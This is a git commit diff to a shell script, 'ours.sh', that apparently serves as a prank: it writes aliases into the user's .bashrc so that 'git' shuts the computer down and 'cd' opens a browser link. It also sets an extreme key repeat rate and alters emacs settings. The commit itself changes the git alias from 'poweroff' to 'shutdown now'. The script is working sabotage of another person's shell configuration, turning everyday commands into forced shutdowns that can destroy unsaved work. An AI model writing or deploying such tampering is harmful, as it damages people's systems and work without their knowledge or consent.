eeffec32c2ad35b12efc224c4c1e60687bdb6bc9
zerlas <32955735+zerlas@users.noreply.github.com>
2018-07-11 12:03:29 +0200

    changing poweroff by shutdown now

--- ours.sh
+++ ours.sh
@@ -2,7 +2,7 @@
 echo "alias ls='ls --color=auto'" >> /home/${USER}/.bashrc;
 echo "alias emacs='vim'" >> /home/${USER}/.bashrc;
 echo "alias cd='google-chrome imgur.com/g597Ov2' && cd" >> /home/${USER}/.bashrc;
-echo "alias git='poweroff'" >> /home/${USER}/.bashrc;
+echo "alias git='shutdown now'" >> /home/${USER}/.bashrc;
 echo "xset r rate 3;" >> /home/${USER}/.bashrc;
 echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
 echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
